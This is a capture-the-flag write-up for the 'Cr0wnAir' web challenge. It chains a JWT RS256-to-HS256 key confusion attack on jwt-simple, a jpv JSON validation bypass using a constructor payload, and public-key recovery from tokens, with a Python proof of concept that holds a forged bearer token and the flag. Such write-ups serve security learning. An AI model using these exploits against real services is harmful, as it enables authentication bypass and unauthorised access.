# Cr0wnAir

* jwt key confusion attacks
* jpv validate bypass
* abusing public key without publickey 

## walkthrough


Obviously there is a RS256-HS256 key confusion attack for `"jwt-simple": "0.5.2"`
Then there is an issue on github [https://github.com/manvel-khnkoyan/jpv/issues/6](https://github.com/manvel-khnkoyan/jpv/issues/6)
so that we can bypass json validation on `sssr`
Lastly, all we need is the publikey. Which can be abused according to [https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/](https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/)

## poc

```python
import requests

url = 'http://34.105.202.19:3000/'

def getkey():
    """
    we need to get two tokens to retrieve publickey
    """
    r = requests.post(url + 'checkin', json={
        'firstName': 'byc',
        'lastName': '404',
        'passport': '423456789',
        'ffp': 'CA12345676',
        'extras': {"a": {"sssr": "FQTU"}, 'constructor': {'name': 'Array'}}
    })
    print(r.json()['token'])

r = requests.post(url + 'upgrades/flag', headers = {
    'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.yncoTDoKFPcSA90PBqPayLUnDhoBEIQay4A6p0tD8z8'
})
print(r.json())
```

flag : `union{I_<3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}`